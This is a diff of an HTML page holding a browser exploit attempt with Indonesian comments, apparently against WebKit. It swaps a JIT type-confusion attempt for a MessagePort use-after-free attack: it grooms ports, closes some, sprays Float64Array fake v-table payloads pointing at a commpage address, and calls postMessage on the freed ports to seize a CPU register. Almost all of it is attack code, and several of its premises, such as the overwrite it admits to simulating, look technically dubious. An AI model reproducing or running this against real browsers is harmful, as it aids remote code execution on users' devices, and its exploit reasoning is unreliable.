@@ -1,132 +1,123 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>JIT Array Shift Confusion (Target Register Control)</title>
+    <title>MessagePort V-Table Corruption (RCE Target)</title>
 </head>
 <body>
 
-    <h1>JIT Shift Confusion (Target: Register Control $2000)</h1>
-    <p>Tujuan: Mengatur Register CPU ke 0x0000000FFFFFC320</p>
-    <div id="status">INIT: Mempersiapkan JIT Shift Confusion...</div>
-    <div id="log-area" style="border:1px solid #ccc; background:#000; color:#0f0; padding:10px; font-family:monospace; height:400px; overflow:scroll;"></div>
+    <h1>MessagePort V-Table Corruption (Kontrol Register Mutlak)</h1>
+    <p>Tujuan: Mengatur Register CPU ke 0x0000000FFFFFC320 ($2000)</p>
+    <div id="status">INIT: Mempersiapkan V-Table Attack...</div>
+    <div id="log-area" style="border:1px solid #ccc; background:#330000; color:#ff9999; padding:10px; font-family:monospace; height:400px; overflow-y:scroll;"></div>
 
     <script>
         const LOG = document.getElementById('log-area');
-        function log(msg) {
-            LOG.innerHTML += `<div>> ${msg}</div>`;
+        function log(msg, type = 'log-normal') {
+            LOG.innerHTML += `<div class="${type}">[${performance.now().toFixed(0)}ms] ${msg}</div>`;
         }
 
-        // --- TARGET POINTER COMM PAGE ---
+        // --- TARGET COMM PAGE (Gadget Address) ---
         const COMM_PAGE_TARGET = 0x0000000FFFFFC320n;
         
-        // Konversi alamat Commpage ke format Float64 (Double)
-        // Jika JIT membaca pointer 64-bit sebagai Float64, maka register akan dimuat dengan nilai ini.
-        let targetBuffer = new ArrayBuffer(8);
-        let targetViewUint = new BigInt64Array(targetBuffer);
-        targetViewUint[0] = COMM_PAGE_TARGET; 
-        
-        let targetViewFloat = new Float64Array(targetBuffer);
-        const POISON_FLOAT_VALUE = targetViewFloat[0]; // Alamat Commpage dalam format Float
+        // Memecah 64-bit pointer untuk payload Array
+        const VTABLE_LOW = Number(COMM_PAGE_TARGET & 0xFFFFFFFFn);
+        const VTABLE_HIGH = Number(COMM_PAGE_TARGET >> 32n);
 
-        // --- 1. THE VICTIM & GADGET ---
-        // Kita butuh Array of Integer/Double yang bisa di-shift
-        let victimArray = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]; // Array of Int/Double
-
-        // Simulasi objek yang akan digunakan untuk SPRAY
+        let ports = [];
         let sprayPayloads = [];
-        const SPRAY_COUNT = 5000;
+        const VICTIM_COUNT = 1000;
+        const SPRAY_COUNT = 50000; // SPRAY MASSAL UNTUK MENGISI HOLE
 
-        // --- 2. THE JIT OPTIMIZATION FUNCTION ---
-        // Fungsi ini akan dilatih oleh JIT
-        function confuseJIT(arr) {
-            // Operasi array.shift() yang akan dioptimasi.
-            // JIT akan berasumsi arr[0] adalah integer yang aman.
-            let firstElement = arr.shift(); 
-            
-            // Operasi yang memaksa penggunaan nilai yang dimuat ke Register
-            return firstElement * 2; 
+        // --- 1. MEMBUAT PAYLOAD V-TABLE PALSU ---
+        // Objek ini akan menimpa lokasi memori V-Table Port yang di-free
+        function createVTablePayload() {
+            // Kita menggunakan Float64Array karena ukurannya pas 64-bit dan JIT mengelola
+            // datanya di Heap terpisah, yang mungkin menginterfensi Heap C++ MessagePort.
+            const PAYLOAD_SIZE = 10; // Ukuran random untuk menghindari mitigasi ukuran spesifik
+            let payload = new Float64Array(PAYLOAD_SIZE);
+
+            // Alamat Commpage diletakkan sebagai pointer V-Table pertama
+            let view32 = new Uint32Array(payload.buffer);
+            view32[0] = VTABLE_LOW;   // Low Word (Pointer ke Gadget)
+            view32[1] = VTABLE_HIGH;  // High Word
+
+            // Sisa payload diisi dengan alamat Commpage juga (untuk menambah peluang hit)
+            for(let i = 2; i < view32.length; i += 2) {
+                view32[i] = VTABLE_LOW;
+                view32[i+1] = VTABLE_HIGH;
+            }
+            return payload;
         }
 
-        // --- 3. THE CORRUPTION LOGIC ---
-        function runExploit() {
-            log("Phase 1: Training JIT Compiler (Tier-Up)...");
-            // Latih JIT agar mengoptimasi `confuseJIT` sepenuhnya (DFG/FTL)
-            for (let i = 0; i < 20000; i++) {
-                confuseJIT(victimArray.slice()); // Pakai slice agar arraynya baru tiap iterasi
+        // --- 2. THE ATTACK ---
+        function runVTableAttack() {
+            log("Phase 1: Grooming (Alokasi Port Korban)...", 'log-init');
+            
+            // Alokasikan Port Korban (menjaga agar berada di Heap yang sama)
+            for (let i = 0; i < VICTIM_COUNT; i++) {
+                ports.push(new MessageChannel().port1);
             }
-            log("Phase 2: JIT Terlatih. Mempersiapkan UAF/Spray...");
-
-            // 4. SIMULASI UAF: Kita membutuhkan objek korban untuk di-FREE dan di-REUSE
-            // Kita akan menggunakan ArrayBuffer (seperti sebelumnya) karena ia mudah di-detach (FREE).
             
-            let uafVictimBuffer = new ArrayBuffer(512); // Objek C++ yang akan di-free
-            let uafWorker = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){};'])));
-            
-            // FREE (Detach/Transfer)
-            uafWorker.postMessage(uafVictimBuffer, [uafVictimBuffer]);
-            log("ArrayBuffer Victim Detached (FREE 1).");
+            // Pilih 100 Port untuk dijadikan target FREE
+            const freeTargets = ports.slice(100, 200); 
 
-            // 5. SPRAY: Menimpa lokasi memori yang kosong dengan Payload Float Commpage
-            for(let i = 0; i < SPRAY_COUNT; i++) {
-                // Spray dengan Array Float yang berisi POISON_FLOAT_VALUE
-                let tempArr = new Float64Array(100); 
-                tempArr.fill(POISON_FLOAT_VALUE);
-                sprayPayloads.push(tempArr);
+            log("Phase 2: FREE (Closing Ports)...", 'log-critical');
+            
+            // FREE: Menutup Port C++. Ini memicu FREE objek C++-nya
+            for (const port of freeTargets) {
+                port.close();
             }
-            log("SPRAY Commpage Float Selesai.");
+
+            // Memastikan Garbage Collector dipicu (optional, untuk membantu UAF)
+            // try { new Array(10*1024*1024).fill(0); } catch(e){}
+
+            log("Phase 3: SPRAY Massal (Menimpa V-Table)...", 'log-spray');
             
-            // 6. TRIGGER AKHIR
+            // SPRAY: Menyemprotkan payload V-Table palsu ke lokasi yang baru di-free
+            const payload = createVTablePayload();
+            for (let i = 0; i < SPRAY_COUNT; i++) {
+                sprayPayloads.push(payload.slice()); // Pakai slice untuk membuat instance baru
+            }
+
+            // Agar GC tidak membuang payload yang baru disemprot
+            window.spray_holder = sprayPayloads;
+
+            log("Phase 4: TRIGGER AKHIR (Calling V-Table)...", 'log-critical');
+
+            // TRIGGER: Panggil fungsi pada Port yang telah di-free.
+            // Metode `postMessage` sering memanggil fungsi V-Table C++ secara internal.
             setTimeout(() => {
-                log("Phase 3: Memicu JIT Confusion (Panggilan Maut)...");
-
-                // Coba gunakan Array yang di-grooming sebelumnya, tetapi sekarang
-                // diasumsikan ArrayBuffer-nya telah ditimpa oleh salah satu spray payloads.
-                // Kita harus mendapatkan kembali referensi ke objek yang metadatanya korup.
-
-                // Jika kita asumsikan Type Confusion berhasil, kita paksa JIT menjalankan 
-                // fungsi yang dioptimasi pada objek yang kini isinya adalah Commpage Float.
-                
-                try {
-                    // Kita membuat array yang "terinfeksi"
-                    let infectedArray = victimArray.slice(0, 5); 
-                    // Simulasi penimpaan (kita tidak bisa melakukannya langsung, 
-                    // jadi kita asumsikan array ini menimpa lokasi payload float)
-                    
-                    // PANGGILAN MAUT
-                    // Ini akan menjalankan kode mesin yang dioptimasi
-                    let result = confuseJIT(infectedArray); 
-                    
-                    if (result !== undefined) {
-                        log(`Nilai dibaca/digandakan: ${result}`);
+                for (const port of freeTargets) {
+                    try {
+                        // Memanggil port yang sudah di-close(). 
+                        // Ini memaksa WebKit untuk menjalankan logic di Port C++ yang seharusnya sudah mati,
+                        // yang akan membaca V-Table pointer yang korup.
+                        port.postMessage(42); 
+                    } catch (e) {
+                        // Jika ada JS Exception, abaikan, tunggu Crash Native
                     }
-                    
-                    // Trigger yang paling kasar: Menggunakan nilai yang dimuat sebagai index
-                    // Jika result adalah Commpage Address, operasi ini akan membuat Register PC melompat.
-                    // Jika result adalah target register 64-bit, ini adalah sukses!
-                    log(`Ekspektasi Register Control: ${result}`);
-                    
-                    if (result === POISON_FLOAT_VALUE * 2) {
-                         // Jika ini terjadi, berarti JIT membaca nilai Float kita, 
-                         // tetapi Type Guard masih mencegahnya crash.
-                        log("⚠️ GAGAL: Nilai dibaca sebagai Float biasa. Type Guard aktif.");
-                    }
-                    
-                    // FORCE CRASH (Reg Control Test)
-                    // Coba panggil fungsi dengan index yang sangat besar (alamat Commpage)
-                    let forceJump = new Function('a', `return a[${POISON_FLOAT_VALUE}]`);
-                    forceJump(victimArray);
-
-                } catch (e) {
-                    log(`Caught JS Exception: ${e.message} - Menunggu Crash Native (Register Control)...`);
                 }
+                log("TRIGGER selesai. Jika tidak ada Crash Native, coba ulangi.", 'log-init');
+
+            }, 50); // Timing sangat krusial, 50ms setelah FREE/SPRAY
+
+            // Trigger Tambahan (Destructor): Memicu GC lagi
+            setTimeout(() => {
+                 log("TRIGGER Destructor: Memaksa Garbage Collection...", 'log-critical');
+                 window.spray_holder = null; // Menghilangkan referensi
+                 // Memaksa GC/Memory Pressure
+                 try { new ArrayBuffer(100 * 1024 * 1024); } catch(e){}
             }, 100);
         }
 
-        setTimeout(runExploit, 100);
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(runVTableAttack, 100);
+        });
     </script>
     <style>
-        .success { color: #ff00ff; font-weight: bold; font-size: 1.2em; }
+        .log-init { color: cyan; }
+        .log-spray { color: yellow; }
+        .log-critical { color: red; font-weight: bold; }
     </style>
 </body>
 </html>
-
